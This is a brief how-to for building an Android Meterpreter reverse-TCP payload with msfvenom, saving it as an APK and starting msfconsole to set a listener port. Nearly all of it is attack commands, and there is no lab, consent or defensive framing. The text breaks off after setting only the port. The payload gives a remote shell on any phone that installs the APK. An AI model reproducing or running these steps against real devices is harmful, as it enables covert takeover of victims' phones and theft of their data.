Metasploit: meterpreter

open your terminal then type the following commands:

msfvenom -p android/meterpreter/reverse_tcp LHOST=< your ip here > LPORT=< your port here > -o android.apk



Replace "< your ip here >" with your ip address and "< your port here >" with any port you want like 4444, 443, 8080, 4545 etc ...



Open another terminal

msfconsole

set LPORT < your port here >
